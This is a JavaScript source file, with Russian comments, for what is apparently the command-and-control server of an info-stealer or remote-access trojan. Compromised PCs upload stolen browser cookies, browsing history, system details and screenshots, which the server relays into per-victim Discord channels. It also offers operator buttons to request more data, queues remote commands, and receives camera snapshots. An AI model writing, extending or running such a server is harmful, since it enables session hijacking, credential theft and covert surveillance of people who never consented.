import express from "express";
import { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, ChannelType } from "discord.js";
import { fileURLToPath } from "url";
import { dirname, join } from "path";
import crypto from "crypto";

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const app = express();
app.use(express.json({ limit: "50mb" }));

// ---------- Конфиг ----------
const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
const GUILD_ID = process.env.GUILD_ID;
const PC_CATEGORY_NAME = "Все ПК";
const CAM_CATEGORY_NAME = "Камеры";
const ONLINE_TIMEOUT = 3 * 60 * 1000; // ПК онлайн
const CAM_ONLINE_TIMEOUT = 1 * 60 * 1000; // Камера онлайн

// ---------- Состояние ----------
const onlinePCs = {};       // pcId -> timestamp
const onlineCams = {};      // camId -> timestamp
const pendingCommands = {}; // pcId -> команды
const pcChannels = {};      // pcId -> канал ПК
const camChannels = {};     // camId -> канал камеры
const pcIdMap = {};         // shortId -> pcId

// ---------- Утилита ----------
function makeShortId(pcId) {
    const shortId = crypto.createHash("sha1").update(pcId).digest("hex").slice(0, 10);
    pcIdMap[shortId] = pcId;
    return shortId;
}

// ---------- Discord Bot ----------
const bot = new Client({ intents: [GatewayIntentBits.Guilds] });
bot.once("clientReady", () => console.log(`✅ Бот вошёл как ${bot.user.tag}`));

// ---------- Категория ----------
async function getOrCreateCategory(guild, name){
    const channels = await guild.channels.fetch();
    let category = channels.find(c => c.type === ChannelType.GuildCategory && c.name === name);
    if(!category) category = await guild.channels.create({ name, type: ChannelType.GuildCategory });
    return category;
}

// ---------- Каналы ----------
async function getOrCreateTextChannel(guild, name, parentId){
    const channels = await guild.channels.fetch();
    let channel = channels.find(c => c.type === ChannelType.GuildText && c.name === name && c.parentId === parentId);
    if(!channel) channel = await guild.channels.create({ name, type: ChannelType.GuildText, parent: parentId });
    return channel;
}

// ---------- Кнопки для ПК ----------
function createControlButtons(pcId) {
    const shortId = makeShortId(pcId);
    return [new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`check_online|${shortId}`).setLabel("Чек онлайн").setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId(`get_cookies|${shortId}`).setLabel("Запросить куки").setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`get_history|${shortId}`).setLabel("Запросить историю").setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`get_system|${shortId}`).setLabel("Системная инфо").setStyle(ButtonStyle.Secondary),
        new ButtonBuilder().setCustomId(`get_screenshot|${shortId}`).setLabel("Скриншот").setStyle(ButtonStyle.Secondary)
    )];
}

async function sendControlButtons(pcId){
    try{
        const guild = await bot.guilds.fetch(GUILD_ID);
        const category = await getOrCreateCategory(guild, PC_CATEGORY_NAME);
        let channel = pcChannels[pcId] ? await guild.channels.fetch(pcChannels[pcId]).catch(()=>null) : null;
        if(!channel) channel = await getOrCreateTextChannel(guild, pcId, category.id);
        pcChannels[pcId] = channel.id;

        await channel.send({ content: `Управление ПК: ${pcId}`, components: createControlButtons(pcId) });
    }catch(e){ console.error("sendControlButtons error:", e); }
}

// ---------- Приём данных ПК ----------
app.post("/upload", async (req,res)=>{
    try{
        const { pcId, cookies, history, systemInfo, screenshot } = req.body;
        if(!pcId) return res.status(400).json({ error:"pcId required" });

        const isNew = !onlinePCs[pcId];
        onlinePCs[pcId] = Date.now();

        const guild = await bot.guilds.fetch(GUILD_ID);
        const category = await getOrCreateCategory(guild, PC_CATEGORY_NAME);
        let channel = pcChannels[pcId] ? await guild.channels.fetch(pcChannels[pcId]).catch(()=>null) : null;
        if(!channel) channel = await getOrCreateTextChannel(guild, pcId, category.id);
        pcChannels[pcId] = channel.id;

        const files = [];
        if(cookies) files.push({ attachment: Buffer.from(JSON.stringify(cookies, null, 2)), name: `${pcId}-cookies.json` });
        if(history) files.push({ attachment: Buffer.from(JSON.stringify(history, null, 2)), name: `${pcId}-history.json` });
        if(systemInfo) files.push({ attachment: Buffer.from(JSON.stringify(systemInfo, null, 2)), name: `${pcId}-system.json` });
        if(screenshot) files.push({ attachment: Buffer.from(screenshot, "base64"), name: `${pcId}-screenshot.jpeg` });
        if(files.length) await channel.send({ files });

        if(isNew) await sendControlButtons(pcId);

        res.json({ success:true });
    }catch(e){ console.error(e); res.status(500).json({ error: e.message }); }
});

// ---------- Приём данных камеры ----------
app.post("/upload-cam", async (req,res)=>{
    try{
        let { camId, screenshot } = req.body;
        if(!camId || !screenshot) return res.status(400).json({ error:"camId и screenshot required" });

        onlineCams[camId] = Date.now();

        const guild = await bot.guilds.fetch(GUILD_ID);
        const category = await getOrCreateCategory(guild, CAM_CATEGORY_NAME);
        let channel = camChannels[camId] ? await guild.channels.fetch(camChannels[camId]).catch(()=>null) : null;
        if(!channel) channel = await getOrCreateTextChannel(guild, camId, category.id);
        camChannels[camId] = channel.id;

        await channel.send({ files:[{ attachment: Buffer.from(screenshot, "base64"), name:`${camId}-screenshot.jpeg` }] });

        res.json({ success:true });
    }catch(e){ console.error(e); res.status(500).json({ error:e.message }); }
});

// ---------- Пинг ПК ----------
app.post("/ping", (req,res)=>{
    const { pcId } = req.body;
    if(!pcId) return res.status(400).json({ error:"pcId required" });
    onlinePCs[pcId] = Date.now();
    const commands = pendingCommands[pcId] || [];
    pendingCommands[pcId] = [];
    res.json({ commands });
});

// ---------- Пинг камеры ----------
app.post("/ping-cam", (req,res)=>{
    const { camId } = req.body;
    if(!camId) return res.status(400).json({ error:"camId required" });
    onlineCams[camId] = Date.now();
    res.json({ success:true });
});

// ---------- Проверка оффлай камер ----------
setInterval(async ()=>{
    const guild = await bot.guilds.fetch(GUILD_ID);
    for(const camId in camChannels){
        if(Date.now() - (onlineCams[camId]||0) > CAM_ONLINE_TIMEOUT){
            try{
                const channel = await guild.channels.fetch(camChannels[camId]);
                if(channel) await channel.delete();
                delete camChannels[camId];
                delete onlineCams[camId];
                console.log(`Канал камеры ${camId} удалён (оффлайн)`);
            }catch(e){ console.error("Удаление канала камеры:", e); }
        }
    }
}, 30*1000); // каждые 30 секунд

// ---------- API ----------
app.get("/api/online-pcs", (req,res)=> res.json(Object.keys(onlinePCs)));
app.get("/api/online-cams", (req,res)=> res.json(Object.keys(onlineCams)));

// ---------- Статика ----------
app.use(express.static(join(__dirname,"public")));

// ---------- Запуск ----------
const PORT = process.env.PORT || 3000;
app.listen(PORT, ()=>console.log(`🚀 Сервер слушает порт ${PORT}`));
bot.login(DISCORD_BOT_TOKEN);
